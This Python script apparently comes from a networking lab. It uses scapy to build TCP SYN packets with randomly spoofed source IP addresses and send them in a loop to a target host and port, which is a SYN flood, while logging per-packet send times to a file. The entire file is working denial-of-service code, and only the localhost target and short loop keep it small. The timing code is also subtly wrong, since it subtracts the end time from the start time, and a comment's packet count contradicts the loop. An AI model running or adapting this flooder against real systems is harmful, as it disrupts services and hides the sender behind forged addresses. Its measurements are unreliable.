import time
from scapy.all import IP, TCP, send, sniff
from random import randint

# initialize global variables:
TARGET_IP = "127.0.0.1"
TARGET_PORT = 9000
FILE_NAME = "syns_result_p.txt"


def randomIP():
    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
    return ip


def randInt():
    x = randint(1000, 8999)
    return x


def create_syn_packet():
    #define the source variables
    s_port = randInt()
    s_eq = randInt()
    w_indow = randInt()

    # build the IP layer
    IP_Packet = IP()
    IP_Packet.src = randomIP()
    IP_Packet.dst = TARGET_IP

    # build the TCP layer
    TCP_Packet = TCP()
    TCP_Packet.sport = s_port
    TCP_Packet.dport = TARGET_PORT
    TCP_Packet.flags = "S"
    TCP_Packet.seq = s_eq
    TCP_Packet.window = w_indow

    synPacket = IP_Packet/TCP_Packet
    return synPacket


def syn_flood():
    #open a file in write mode in order to save the packet's data
    file = open(FILE_NAME, 'w')
    #define a times array - for calculating the avg time
    times = []
    
    print("Packets are sending ...")
    
    #send 1000000 packets to the target
    for index in range(0, 10):
        # start the timer - in order to calculate the build packet time
        start = time.time()*1000

        # build the syn packet
        synPacket = create_syn_packet()
    
        # send the packet to the target
        send(synPacket)
        # send(synPacket, verbose=0)

        # after sending the packet - close the the timer
        end = time.time()*1000
        # calculate the sent packet time
        sentTime = start - end

        # add the sent time to the array
        times.append(sentTime)

        # add the packet data to the file
        textToFile = "Packet number: " + \
            str(index) + "Sent packet time: " + str(sentTime) + "(ms)\n"
        file.write(textToFile)
        
    # calculate the avg time that took to send a packet
    sumTime = 0
    for dataTime in times:
        sumTime += dataTime
    avgTime = sumTime/len(times)
    
    # add the avg time to the file
    textToFile = "\nThe average time to send a syn packet in python is: " + \
        str(avgTime) + "(ms)"
    file.write(textToFile)

syn_flood()